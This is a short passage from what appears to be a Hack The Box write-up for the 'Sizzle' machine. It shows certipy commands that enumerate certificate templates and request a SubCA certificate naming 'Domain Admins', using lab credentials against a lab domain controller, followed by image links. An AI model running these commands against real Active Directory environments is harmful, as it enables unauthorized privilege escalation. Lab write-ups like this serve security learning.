...
certipy find -u amanda -p Ashare1972 -dc-ip 10.129.89.62

certipy req -u 'amanda@HTB.LOCAL' -p 'Ashare1972' -ca 'HTB-SIZZLE-CA' -template 'SubCA' -alt 'Domain Admins' -dc-ip 10.129.89.62

```
![](/assets/images/posts/2025-03-08-Sizzle/0b7776e5bf429f95044c8fb4e5e9c1f3_MD5.jpeg)
![](/assets/images/posts/2025-03-08-Sizzle/acd949ce861a42762b3c9d278067f861_MD5.jpeg)
### ING
```
Domain : HTB.LOCAL
